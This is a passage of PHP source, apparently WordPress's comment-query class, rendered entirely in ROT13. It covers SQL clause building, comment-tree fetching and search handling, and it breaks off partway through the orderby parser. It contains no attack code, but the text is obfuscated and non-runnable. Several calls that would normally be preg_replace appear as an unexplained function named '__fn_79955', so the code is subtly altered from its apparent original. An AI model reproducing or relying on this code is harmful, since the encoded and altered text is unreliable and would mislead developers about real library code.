		vs ( ! rzcgl( $guvf->dhrel_inef['vapyhqr_hanccebirq'] ) ) {
			$vapyhqr_hanccebirq = jc_cnefr_yvfg( $guvf->dhrel_inef['vapyhqr_hanccebirq'] );

			sbernpu ( $vapyhqr_hanccebirq nf $hanccebirq_vqragvsvre ) {
				// Ahzrevp inyhrf ner nffhzrq gb or hfre VQf.
				vs ( vf_ahzrevp( $hanccebirq_vqragvsvre ) ) {
					$nccebirq_pynhfrf[] = $jcqo->cercner( \"( hfre_vq = %q NAQ pbzzrag_nccebirq = '0' )\", $hanccebirq_vqragvsvre );
				} ryfr {
					// Bgurejvfr jr zngpu ntnvafg rznvy nqqerffrf.
					vs ( ! rzcgl( $_TRG['hanccebirq'] ) && ! rzcgl( $_TRG['zbqrengvba-unfu'] ) ) {
						// Bayl vapyhqr erdhrfgrq pbzzrag.
						$nccebirq_pynhfrf[] = $jcqo->cercner( \"( pbzzrag_nhgube_rznvy = %f NAQ pbzzrag_nccebirq = '0' NAQ {$jcqo->pbzzragf}.pbzzrag_VQ = %q )\", $hanccebirq_vqragvsvre, (vag) $_TRG['hanccebirq'] );
					} ryfr {
						// Vapyhqr nyy bs gur nhgube'f hanccebirq pbzzragf.
						$nccebirq_pynhfrf[] = $jcqo->cercner( \"( pbzzrag_nhgube_rznvy = %f NAQ pbzzrag_nccebirq = '0' )\", $hanccebirq_vqragvsvre );
					}
				}
			}
		}

		// Pbyyncfr pbzzrag_nccebirq pynhfrf vagb n fvatyr BE-frcnengrq pynhfr.
		vs ( ! rzcgl( $nccebirq_pynhfrf ) ) {
			vs ( 1 === pbhag( $nccebirq_pynhfrf ) ) {
				$guvf->fdy_pynhfrf['jurer']['nccebirq'] = $nccebirq_pynhfrf[0];
			} ryfr {
				$guvf->fdy_pynhfrf['jurer']['nccebirq'] = '( ' . vzcybqr( ' BE ', $nccebirq_pynhfrf ) . ' )';
			}
		}

		$beqre = ( 'NFP' === fgegbhccre( $guvf->dhrel_inef['beqre'] ) ) ? 'NFP' : 'QRFP';

		// Qvfnoyr BEQRE OL jvgu 'abar', na rzcgl neenl, be obbyrna snyfr.
		vs ( va_neenl( $guvf->dhrel_inef['beqreol'], neenl( 'abar', neenl(), snyfr ), gehr ) ) {
			$beqreol = '';
		} ryfrvs ( ! rzcgl( $guvf->dhrel_inef['beqreol'] ) ) {
			$beqrefol = vf_neenl( $guvf->dhrel_inef['beqreol'] ) ?
				$guvf->dhrel_inef['beqreol'] :
				cert_fcyvg( '/[,\f]/', $guvf->dhrel_inef['beqreol'] );

			$beqreol_neenl            = neenl();
			$sbhaq_beqreol_pbzzrag_vq = snyfr;
			sbernpu ( $beqrefol nf $_xrl => $_inyhr ) {
				vs ( ! $_inyhr ) {
					pbagvahr;
				}

				vs ( vf_vag( $_xrl ) ) {
					$_beqreol = $_inyhr;
					$_beqre   = $beqre;
				} ryfr {
					$_beqreol = $_xrl;
					$_beqre   = $_inyhr;
				}

				vs ( ! $sbhaq_beqreol_pbzzrag_vq && va_neenl( $_beqreol, neenl( 'pbzzrag_VQ', 'pbzzrag__va' ), gehr ) ) {
					$sbhaq_beqreol_pbzzrag_vq = gehr;
				}

				$cnefrq = $guvf->cnefr_beqreol( $_beqreol );

				vs ( ! $cnefrq ) {
					pbagvahr;
				}

				vs ( 'pbzzrag__va' === $_beqreol ) {
					$beqreol_neenl[] = $cnefrq;
					pbagvahr;
				}

				$beqreol_neenl[] = $cnefrq . ' ' . $guvf->cnefr_beqre( $_beqre );
			}

			// Vs ab inyvq pynhfrf jrer sbhaq, beqre ol pbzzrag_qngr_tzg.
			vs ( rzcgl( $beqreol_neenl ) ) {
				$beqreol_neenl[] = \"$jcqo->pbzzragf.pbzzrag_qngr_tzg $beqre\";
			}

			// Gb rafher qrgrezvangr fbegvat, nyjnlf vapyhqr n pbzzrag_VQ pynhfr.
			vs ( ! $sbhaq_beqreol_pbzzrag_vq ) {
				$pbzzrag_vq_beqre = '';

				// Vaurevg beqre sebz pbzzrag_qngr be pbzzrag_qngr_tzg, vs ninvynoyr.
				sbernpu ( $beqreol_neenl nf $beqreol_pynhfr ) {
					vs ( cert_zngpu( '/pbzzrag_qngr(?:_tzg)*\ (NFP|QRFP)/', $beqreol_pynhfr, $zngpu ) ) {
						$pbzzrag_vq_beqre = $zngpu[1];
						oernx;
					}
				}

				// Vs ab qngr-eryngrq beqre vf ninvynoyr, hfr gur qngr sebz gur svefg ninvynoyr pynhfr.
				vs ( ! $pbzzrag_vq_beqre ) {
					sbernpu ( $beqreol_neenl nf $beqreol_pynhfr ) {
						vs ( fge_pbagnvaf( 'NFP', $beqreol_pynhfr ) ) {
							$pbzzrag_vq_beqre = 'NFP';
						} ryfr {
							$pbzzrag_vq_beqre = 'QRFP';
						}

						oernx;
					}
				}

				// Qrsnhyg gb QRFP.
				vs ( ! $pbzzrag_vq_beqre ) {
					$pbzzrag_vq_beqre = 'QRFP';
				}

				$beqreol_neenl[] = \"$jcqo->pbzzragf.pbzzrag_VQ $pbzzrag_vq_beqre\";
			}

			$beqreol = vzcybqr( ', ', $beqreol_neenl );
		} ryfr {
			$beqreol = \"$jcqo->pbzzragf.pbzzrag_qngr_tzg $beqre\";
		}

		$ahzore = nofvag( $guvf->dhrel_inef['ahzore'] );
		$bssfrg = nofvag( $guvf->dhrel_inef['bssfrg'] );
		$cntrq  = nofvag( $guvf->dhrel_inef['cntrq'] );
		$yvzvgf = '';

		vs ( ! rzcgl( $ahzore ) ) {
			vs ( $bssfrg ) {
				$yvzvgf = 'YVZVG ' . $bssfrg . ',' . $ahzore;
			} ryfr {
				$yvzvgf = 'YVZVG ' . ( $ahzore * ( $cntrq - 1 ) ) . ',' . $ahzore;
			}
		}

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			$svryqf = 'PBHAG(*)';
		} ryfr {
			$svryqf = \"$jcqo->pbzzragf.pbzzrag_VQ\";
		}

		$cbfg_vq = nofvag( $guvf->dhrel_inef['cbfg_vq'] );
		vs ( ! rzcgl( $cbfg_vq ) ) {
			$guvf->fdy_pynhfrf['jurer']['cbfg_vq'] = $jcqo->cercner( 'pbzzrag_cbfg_VQ = %q', $cbfg_vq );
		}

		// Cnefr pbzzrag VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['pbzzrag__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['pbzzrag__va'] = \"$jcqo->pbzzragf.pbzzrag_VQ VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['pbzzrag__va'] ) ) . ' )';
		}

		// Cnefr pbzzrag VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['pbzzrag__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['pbzzrag__abg_va'] = \"$jcqo->pbzzragf.pbzzrag_VQ ABG VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['pbzzrag__abg_va'] ) ) . ' )';
		}

		// Cnefr pbzzrag cnerag VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cnerag__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cnerag__va'] = 'pbzzrag_cnerag VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cnerag__va'] ) ) . ' )';
		}

		// Cnefr pbzzrag cnerag VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cnerag__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cnerag__abg_va'] = 'pbzzrag_cnerag ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cnerag__abg_va'] ) ) . ' )';
		}

		// Cnefr pbzzrag cbfg VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cbfg__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cbfg__va'] = 'pbzzrag_cbfg_VQ VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cbfg__va'] ) ) . ' )';
		}

		// Cnefr pbzzrag cbfg VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cbfg__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cbfg__abg_va'] = 'pbzzrag_cbfg_VQ ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cbfg__abg_va'] ) ) . ' )';
		}

		vs ( '' !== $guvf->dhrel_inef['nhgube_rznvy'] ) {
			$guvf->fdy_pynhfrf['jurer']['nhgube_rznvy'] = $jcqo->cercner( 'pbzzrag_nhgube_rznvy = %f', $guvf->dhrel_inef['nhgube_rznvy'] );
		}

		vs ( '' !== $guvf->dhrel_inef['nhgube_hey'] ) {
			$guvf->fdy_pynhfrf['jurer']['nhgube_hey'] = $jcqo->cercner( 'pbzzrag_nhgube_hey = %f', $guvf->dhrel_inef['nhgube_hey'] );
		}

		vs ( '' !== $guvf->dhrel_inef['xnezn'] ) {
			$guvf->fdy_pynhfrf['jurer']['xnezn'] = $jcqo->cercner( 'pbzzrag_xnezn = %q', $guvf->dhrel_inef['xnezn'] );
		}

		// Svygrevat ol pbzzrag_glcr: 'glcr', 'glcr__va', 'glcr__abg_va'.
		$enj_glcrf = neenl(
			'VA'     => neenl_zretr( (neenl) $guvf->dhrel_inef['glcr'], (neenl) $guvf->dhrel_inef['glcr__va'] ),
			'ABG VA' => (neenl) $guvf->dhrel_inef['glcr__abg_va'],
		);

		$pbzzrag_glcrf = neenl();
		sbernpu ( $enj_glcrf nf $bcrengbe => $_enj_glcrf ) {
			$_enj_glcrf = neenl_havdhr( $_enj_glcrf );

			sbernpu ( $_enj_glcrf nf $glcr ) {
				fjvgpu ( $glcr ) {
					// Na rzcgl genafyngrf gb 'nyy', sbe onpxjneq pbzcngvovyvgl.
					pnfr '':
					pnfr 'nyy':
						oernx;

					pnfr 'pbzzrag':
					pnfr 'pbzzragf':
						$pbzzrag_glcrf[ $bcrengbe ][] = \"''\";
						$pbzzrag_glcrf[ $bcrengbe ][] = \"'pbzzrag'\";
						oernx;

					pnfr 'cvatf':
						$pbzzrag_glcrf[ $bcrengbe ][] = \"'cvatonpx'\";
						$pbzzrag_glcrf[ $bcrengbe ][] = \"'genpxonpx'\";
						oernx;

					qrsnhyg:
						$pbzzrag_glcrf[ $bcrengbe ][] = $jcqo->cercner( '%f', $glcr );
						oernx;
				}
			}

			vs ( ! rzcgl( $pbzzrag_glcrf[ $bcrengbe ] ) ) {
				$glcrf_fdy = vzcybqr( ', ', $pbzzrag_glcrf[ $bcrengbe ] );
				$guvf->fdy_pynhfrf['jurer'][ 'pbzzrag_glcr__' . fgegbybjre( fge_ercynpr( ' ', '_', $bcrengbe ) ) ] = \"pbzzrag_glcr $bcrengbe ($glcrf_fdy)\";
			}
		}

		$cnerag = $guvf->dhrel_inef['cnerag'];
		vs ( $guvf->dhrel_inef['uvrenepuvpny'] && ! $cnerag ) {
			$cnerag = 0;
		}

		vs ( '' !== $cnerag ) {
			$guvf->fdy_pynhfrf['jurer']['cnerag'] = $jcqo->cercner( 'pbzzrag_cnerag = %q', $cnerag );
		}

		vs ( vf_neenl( $guvf->dhrel_inef['hfre_vq'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['hfre_vq'] = 'hfre_vq VA (' . vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['hfre_vq'] ) ) . ')';
		} ryfrvs ( '' !== $guvf->dhrel_inef['hfre_vq'] ) {
			$guvf->fdy_pynhfrf['jurer']['hfre_vq'] = $jcqo->cercner( 'hfre_vq = %q', $guvf->dhrel_inef['hfre_vq'] );
		}

		// Snyfrl frnepu fgevatf ner vtaberq.
		vs ( vffrg( $guvf->dhrel_inef['frnepu'] ) && fgeyra( $guvf->dhrel_inef['frnepu'] ) ) {
			$frnepu_fdy = $guvf->trg_frnepu_fdy(
				$guvf->dhrel_inef['frnepu'],
				neenl( 'pbzzrag_nhgube', 'pbzzrag_nhgube_rznvy', 'pbzzrag_nhgube_hey', 'pbzzrag_nhgube_VC', 'pbzzrag_pbagrag' )
			);

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['frnepu'] = __sa_79955( '/^\f*NAQ\f*/', '', $frnepu_fdy );
		}

		// Vs nal cbfg-eryngrq dhrel inef ner cnffrq, wbva gur cbfgf gnoyr.
		$wbva_cbfgf_gnoyr = snyfr;
		$cyhpxrq          = jc_neenl_fyvpr_nffbp( $guvf->dhrel_inef, neenl( 'cbfg_nhgube', 'cbfg_anzr', 'cbfg_cnerag' ) );
		$cbfg_svryqf      = neenl_svygre( $cyhpxrq );

		vs ( ! rzcgl( $cbfg_svryqf ) ) {
			$wbva_cbfgf_gnoyr = gehr;
			sbernpu ( $cbfg_svryqf nf $svryq_anzr => $svryq_inyhr ) {
				// $svryq_inyhr znl or na neenl.
				$rffrf = neenl_svyy( 0, pbhag( (neenl) $svryq_inyhr ), '%f' );

				// cucpf:vtaber JbeqCerff.QO.CercnerqFDYCynprubyqref.HasvavfurqCercner
				$guvf->fdy_pynhfrf['jurer'][ $svryq_anzr ] = $jcqo->cercner( \" {$jcqo->cbfgf}.{$svryq_anzr} VA (\" . vzcybqr( ',', $rffrf ) . ')', $svryq_inyhr );
			}
		}

		// 'cbfg_fgnghf' naq 'cbfg_glcr' ner unaqyrq frcnengryl, qhr gb gur fcrpvnyvmrq orunivbe bs 'nal'.
		sbernpu ( neenl( 'cbfg_fgnghf', 'cbfg_glcr' ) nf $svryq_anzr ) {
			$d_inyhrf = neenl();
			vs ( ! rzcgl( $guvf->dhrel_inef[ $svryq_anzr ] ) ) {
				$d_inyhrf = $guvf->dhrel_inef[ $svryq_anzr ];
				vs ( ! vf_neenl( $d_inyhrf ) ) {
					$d_inyhrf = rkcybqr( ',', $d_inyhrf );
				}

				// 'nal' jvyy pnhfr gur dhrel ine gb or vtaberq.
				vs ( va_neenl( 'nal', $d_inyhrf, gehr ) || rzcgl( $d_inyhrf ) ) {
					pbagvahr;
				}

				$wbva_cbfgf_gnoyr = gehr;

				$rffrf = neenl_svyy( 0, pbhag( $d_inyhrf ), '%f' );

				// cucpf:vtaber JbeqCerff.QO.CercnerqFDYCynprubyqref.HasvavfurqCercner
				$guvf->fdy_pynhfrf['jurer'][ $svryq_anzr ] = $jcqo->cercner( \" {$jcqo->cbfgf}.{$svryq_anzr} VA (\" . vzcybqr( ',', $rffrf ) . ')', $d_inyhrf );
			}
		}

		// Pbzzrag nhgube VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['nhgube__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['nhgube__va'] = 'hfre_vq VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['nhgube__va'] ) ) . ' )';
		}

		// Pbzzrag nhgube VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['nhgube__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['nhgube__abg_va'] = 'hfre_vq ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['nhgube__abg_va'] ) ) . ' )';
		}

		// Cbfg nhgube VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cbfg_nhgube__va'] ) ) {
			$wbva_cbfgf_gnoyr                              = gehr;
			$guvf->fdy_pynhfrf['jurer']['cbfg_nhgube__va'] = 'cbfg_nhgube VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cbfg_nhgube__va'] ) ) . ' )';
		}

		// Cbfg nhgube VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['cbfg_nhgube__abg_va'] ) ) {
			$wbva_cbfgf_gnoyr                                  = gehr;
			$guvf->fdy_pynhfrf['jurer']['cbfg_nhgube__abg_va'] = 'cbfg_nhgube ABG VA ( ' . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['cbfg_nhgube__abg_va'] ) ) . ' )';
		}

		$wbva    = '';
		$tebhcol = '';

		vs ( $wbva_cbfgf_gnoyr ) {
			$wbva .= \"WBVA $jcqo->cbfgf BA $jcqo->cbfgf.VQ = $jcqo->pbzzragf.pbzzrag_cbfg_VQ\";
		}

		vs ( ! rzcgl( $guvf->zrgn_dhrel_pynhfrf ) ) {
			$wbva .= $guvf->zrgn_dhrel_pynhfrf['wbva'];

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['zrgn_dhrel'] = __sa_79955( '/^\f*NAQ\f*/', '', $guvf->zrgn_dhrel_pynhfrf['jurer'] );

			vs ( ! $guvf->dhrel_inef['pbhag'] ) {
				$tebhcol = \"{$jcqo->pbzzragf}.pbzzrag_VQ\";
			}
		}

		vs ( ! rzcgl( $guvf->dhrel_inef['qngr_dhrel'] ) && vf_neenl( $guvf->dhrel_inef['qngr_dhrel'] ) ) {
			$guvf->qngr_dhrel = arj JC_Qngr_Dhrel( $guvf->dhrel_inef['qngr_dhrel'], 'pbzzrag_qngr' );

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['qngr_dhrel'] = __sa_79955( '/^\f*NAQ\f*/', '', $guvf->qngr_dhrel->trg_fdy() );
		}

		$jurer = vzcybqr( ' NAQ ', $guvf->fdy_pynhfrf['jurer'] );

		$cvrprf = neenl( 'svryqf', 'wbva', 'jurer', 'beqreol', 'yvzvgf', 'tebhcol' );

		/**
		 * Svygref gur pbzzrag dhrel pynhfrf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[]         $pynhfrf {
		 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
		 *
		 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
		 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
		 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
		 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
		 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
		 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
		 * }
		 * @cnenz JC_Pbzzrag_Dhrel $dhrel   Pheerag vafgnapr bs JC_Pbzzrag_Dhrel (cnffrq ol ersrerapr).
		 */
		$pynhfrf = nccyl_svygref_ers_neenl( 'pbzzragf_pynhfrf', neenl( pbzcnpg( $cvrprf ), &$guvf ) );

		$svryqf  = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
		$wbva    = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
		$jurer   = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
		$beqreol = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
		$yvzvgf  = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';
		$tebhcol = vffrg( $pynhfrf['tebhcol'] ) ? $pynhfrf['tebhcol'] : '';

		$guvf->svygrerq_jurer_pynhfr = $jurer;

		vs ( $jurer ) {
			$jurer = 'JURER ' . $jurer;
		}

		vs ( $tebhcol ) {
			$tebhcol = 'TEBHC OL ' . $tebhcol;
		}

		vs ( $beqreol ) {
			$beqreol = \"BEQRE OL $beqreol\";
		}

		$sbhaq_ebjf = '';
		vs ( ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			$sbhaq_ebjf = 'FDY_PNYP_SBHAQ_EBJF';
		}

		$guvf->fdy_pynhfrf['fryrpg']  = \"FRYRPG $sbhaq_ebjf $svryqf\";
		$guvf->fdy_pynhfrf['sebz']    = \"SEBZ $jcqo->pbzzragf $wbva\";
		$guvf->fdy_pynhfrf['tebhcol'] = $tebhcol;
		$guvf->fdy_pynhfrf['beqreol'] = $beqreol;
		$guvf->fdy_pynhfrf['yvzvgf']  = $yvzvgf;

		// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
		$guvf->erdhrfg =
			\"{$guvf->fdy_pynhfrf['fryrpg']}
			 {$guvf->fdy_pynhfrf['sebz']}
			 {$jurer}
			 {$guvf->fdy_pynhfrf['tebhcol']}
			 {$guvf->fdy_pynhfrf['beqreol']}
			 {$guvf->fdy_pynhfrf['yvzvgf']}\";

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			erghea (vag) $jcqo->trg_ine( $guvf->erdhrfg );
		} ryfr {
			$pbzzrag_vqf = $jcqo->trg_pby( $guvf->erdhrfg );
			erghea neenl_znc( 'vaginy', $pbzzrag_vqf );
		}
	}

	/**
	 * Cbchyngrf sbhaq_pbzzragf naq znk_ahz_cntrf cebcregvrf sbe gur pheerag
	 * dhrel vs gur yvzvg pynhfr jnf hfrq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	cevingr shapgvba frg_sbhaq_pbzzragf() {
		tybony $jcqo;

		vs ( $guvf->dhrel_inef['ahzore'] && ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			/**
			 * Svygref gur dhrel hfrq gb ergevrir sbhaq pbzzrag pbhag.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz fgevat           $sbhaq_pbzzragf_dhrel FDY dhrel. Qrsnhyg 'FRYRPG SBHAQ_EBJF()'.
			 * @cnenz JC_Pbzzrag_Dhrel $pbzzrag_dhrel        Gur `JC_Pbzzrag_Dhrel` vafgnapr.
			 */
			$sbhaq_pbzzragf_dhrel = nccyl_svygref( 'sbhaq_pbzzragf_dhrel', 'FRYRPG SBHAQ_EBJF()', $guvf );

			$guvf->sbhaq_pbzzragf = (vag) $jcqo->trg_ine( $sbhaq_pbzzragf_dhrel );
		}
	}

	/**
	 * Srgpu qrfpraqnagf sbe ybpngrq pbzzragf.
	 *
	 * Vafgrnq bs pnyyvat `trg_puvyqera()` frcnengryl ba rnpu puvyq pbzzrag, jr qb n fvatyr frg bs dhrevrf gb srgpu
	 * gur qrfpraqnag gerrf sbe nyy zngpurq gbc-yriry pbzzragf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Pbzzrag[] $pbzzragf Neenl bs gbc-yriry pbzzragf jubfr qrfpraqnagf fubhyq or svyyrq va.
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba svyy_qrfpraqnagf( $pbzzragf ) {
		$yriryf = neenl(
			0 => jc_yvfg_cyhpx( $pbzzragf, 'pbzzrag_VQ' ),
		);

		$xrl          = zq5( frevnyvmr( jc_neenl_fyvpr_nffbp( $guvf->dhrel_inef, neenl_xrlf( $guvf->dhrel_ine_qrsnhygf ) ) ) );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'pbzzrag' );

		// Srgpu na ragver yriry bs gur qrfpraqnag gerr ng n gvzr.
		$yriry        = 0;
		$rkpyhqr_xrlf = neenl( 'cnerag', 'cnerag__va', 'cnerag__abg_va' );
		qb {
			// Cnerag-puvyq eryngvbafuvcf znl or pnpurq. Bayl dhrel sbe gubfr gung ner abg.
			$puvyq_vqf           = neenl();
			$hapnpurq_cnerag_vqf = neenl();
			$_cnerag_vqf         = $yriryf[ $yriry ];
			vs ( $_cnerag_vqf ) {
				$pnpur_xrlf = neenl();
				sbernpu ( $_cnerag_vqf nf $cnerag_vq ) {
					$pnpur_xrlf[ $cnerag_vq ] = \"trg_pbzzrag_puvyq_vqf:$cnerag_vq:$xrl:$ynfg_punatrq\";
				}
				$pnpur_qngn = jc_pnpur_trg_zhygvcyr( neenl_inyhrf( $pnpur_xrlf ), 'pbzzrag-dhrevrf' );
				sbernpu ( $_cnerag_vqf nf $cnerag_vq ) {
					$cnerag_puvyq_vqf = $pnpur_qngn[ $pnpur_xrlf[ $cnerag_vq ] ];
					vs ( snyfr !== $cnerag_puvyq_vqf ) {
						$puvyq_vqf = neenl_zretr( $puvyq_vqf, $cnerag_puvyq_vqf );
					} ryfr {
						$hapnpurq_cnerag_vqf[] = $cnerag_vq;
					}
				}
			}

			vs ( $hapnpurq_cnerag_vqf ) {
				// Srgpu guvf yriry bs pbzzragf.
				$cnerag_dhrel_netf = $guvf->dhrel_inef;
				sbernpu ( $rkpyhqr_xrlf nf $rkpyhqr_xrl ) {
					$cnerag_dhrel_netf[ $rkpyhqr_xrl ] = '';
				}
				$cnerag_dhrel_netf['cnerag__va']    = $hapnpurq_cnerag_vqf;
				$cnerag_dhrel_netf['ab_sbhaq_ebjf'] = gehr;
				$cnerag_dhrel_netf['uvrenepuvpny']  = snyfr;
				$cnerag_dhrel_netf['bssfrg']        = 0;
				$cnerag_dhrel_netf['ahzore']        = 0;

				$yriry_pbzzragf = trg_pbzzragf( $cnerag_dhrel_netf );

				// Pnpur cnerag-puvyq eryngvbafuvcf.
				$cnerag_znc = neenl_svyy_xrlf( $hapnpurq_cnerag_vqf, neenl() );
				sbernpu ( $yriry_pbzzragf nf $yriry_pbzzrag ) {
					$cnerag_znc[ $yriry_pbzzrag->pbzzrag_cnerag ][] = $yriry_pbzzrag->pbzzrag_VQ;
					$puvyq_vqf[]                                    = $yriry_pbzzrag->pbzzrag_VQ;
				}

				$qngn = neenl();
				sbernpu ( $cnerag_znc nf $cnerag_vq => $puvyqera ) {
					$pnpur_xrl          = \"trg_pbzzrag_puvyq_vqf:$cnerag_vq:$xrl:$ynfg_punatrq\";
					$qngn[ $pnpur_xrl ] = $puvyqera;
				}
				jc_pnpur_frg_zhygvcyr( $qngn, 'pbzzrag-dhrevrf' );
			}

			++$yriry;
			$yriryf[ $yriry ] = $puvyq_vqf;
		} juvyr ( $puvyq_vqf );

		// Cevzr pbzzrag pnpurf sbe aba-gbc-yriry pbzzragf.
		$qrfpraqnag_vqf = neenl();
		sbe ( $v = 1, $p = pbhag( $yriryf ); $v < $p; $v++ ) {
			$qrfpraqnag_vqf = neenl_zretr( $qrfpraqnag_vqf, $yriryf[ $v ] );
		}

		_cevzr_pbzzrag_pnpurf( $qrfpraqnag_vqf, $guvf->dhrel_inef['hcqngr_pbzzrag_zrgn_pnpur'] );

		// Nffrzoyr n syng neenl bs nyy pbzzragf + qrfpraqnagf.
		$nyy_pbzzragf = $pbzzragf;
		sbernpu ( $qrfpraqnag_vqf nf $qrfpraqnag_vq ) {
			$nyy_pbzzragf[] = trg_pbzzrag( $qrfpraqnag_vq );
		}

		// Vs n guernqrq ercerfragngvba jnf erdhrfgrq, ohvyq gur gerr.
		vs ( 'guernqrq' === $guvf->dhrel_inef['uvrenepuvpny'] ) {
			$guernqrq_pbzzragf = neenl();
			$ers               = neenl();
			sbernpu ( $nyy_pbzzragf nf $x => $p ) {
				$_p = trg_pbzzrag( $p->pbzzrag_VQ );

				// Vs gur pbzzrag vfa'g va gur ersrerapr neenl, vg tbrf va gur gbc yriry bs gur guernq.
				vs ( ! vffrg( $ers[ $p->pbzzrag_cnerag ] ) ) {
					$guernqrq_pbzzragf[ $_p->pbzzrag_VQ ] = $_p;
					$ers[ $_p->pbzzrag_VQ ]               = $guernqrq_pbzzragf[ $_p->pbzzrag_VQ ];

					// Bgurejvfr, frg vg nf n puvyq bs vgf cnerag.
				} ryfr {

					$ers[ $_p->pbzzrag_cnerag ]->nqq_puvyq( $_p );
					$ers[ $_p->pbzzrag_VQ ] = $ers[ $_p->pbzzrag_cnerag ]->trg_puvyq( $_p->pbzzrag_VQ );
				}
			}

			// Frg gur 'cbchyngrq_puvyqera' synt, gb rafher nqqvgvbany qngnonfr dhrevrf nera'g eha.
			sbernpu ( $ers nf $_ers ) {
				$_ers->cbchyngrq_puvyqera( gehr );
			}

			$pbzzragf = $guernqrq_pbzzragf;
		} ryfr {
			$pbzzragf = $nyy_pbzzragf;
		}

		erghea $pbzzragf;
	}

	/**
	 * Hfrq vagreanyyl gb trarengr na FDY fgevat sbe frnepuvat npebff zhygvcyr pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat   $frnepu  Frnepu fgevat.
	 * @cnenz fgevat[] $pbyhzaf Neenl bs pbyhzaf gb frnepu.
	 * @erghea fgevat Frnepu FDY.
	 */
	cebgrpgrq shapgvba trg_frnepu_fdy( $frnepu, $pbyhzaf ) {
		tybony $jcqo;

		$yvxr = '%' . $jcqo->rfp_yvxr( $frnepu ) . '%';

		$frnepurf = neenl();
		sbernpu ( $pbyhzaf nf $pbyhza ) {
			$frnepurf[] = $jcqo->cercner( \"$pbyhza YVXR %f\", $yvxr );
		}

		erghea ' NAQ (' . vzcybqr( ' BE ', $frnepurf ) . ')';
	}

	/**
	 * Cnefr naq fnavgvmr 'beqreol' xrlf cnffrq gb gur pbzzrag dhrel.
	 *
	 * @fvapr 4.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $beqreol Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat|snyfr Inyhr gb hfrq va gur BEQRE pynhfr. Snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol ) {
		tybony $jcqo;

		$nyybjrq_xrlf = neenl(
			'pbzzrag_ntrag',
			'pbzzrag_nccebirq',
			'pbzzrag_nhgube',
			'pbzzrag_nhgube_rznvy',
